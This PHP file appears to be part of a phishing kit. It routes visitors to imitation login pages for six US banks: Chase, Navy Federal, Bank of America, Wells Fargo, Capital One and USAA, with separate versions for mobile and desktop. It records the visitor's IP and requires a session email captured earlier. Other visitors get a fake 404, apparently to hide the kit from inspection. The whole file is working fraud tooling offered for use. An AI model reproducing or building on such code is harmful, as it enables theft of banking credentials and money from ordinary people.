<?php
session_start();
require_once('main.php');
$random = substr(sha1(mt_rand()),1,25);
$ip = getUserIP();
if (!isset($_SESSION['email'])) {
exit(header("HTTP/1.0 404 Not Found"));
}
if ($_GET['bank'] == "chase") {
if($os == "Android" or $os == "iPhone") {
    require_once("files/bank/chase-mobile.php");
  }else{
    require_once("files/bank/chase-desktop.php");
  }
}
if ($_GET['bank'] == "navy") {
if($os == "Android" or $os == "iPhone") {
    require_once("files/bank/navy-mobile.php");
  }else{
    require_once("files/bank/navy-desktop.php");
  }
}
if ($_GET['bank'] == "boa") {
if($os == "Android" or $os == "iPhone") {
    require_once("files/bank/boa-mobile.php");
  }else{
    require_once("files/bank/boa-desktop.php");
  }
}
if ($_GET['bank'] == "wells") {
if($os == "Android" or $os == "iPhone") {
    require_once("files/bank/wells-mobile.php");
  }else{
    require_once("files/bank/wells-desktop.php");
  }
}
if ($_GET['bank'] == "capitalone") {
if($os == "Android" or $os == "iPhone") {
    require_once("files/bank/capital-mobile.php");
  }else{
    require_once("files/bank/capital-desktop.php");
  }
}
if ($_GET['bank'] == "usaa") {
if($os == "Android" or $os == "iPhone") {
    require_once("files/bank/usaa-mobile.php");
  }else{
    require_once("files/bank/usaa-desktop.php");
  }
}
?>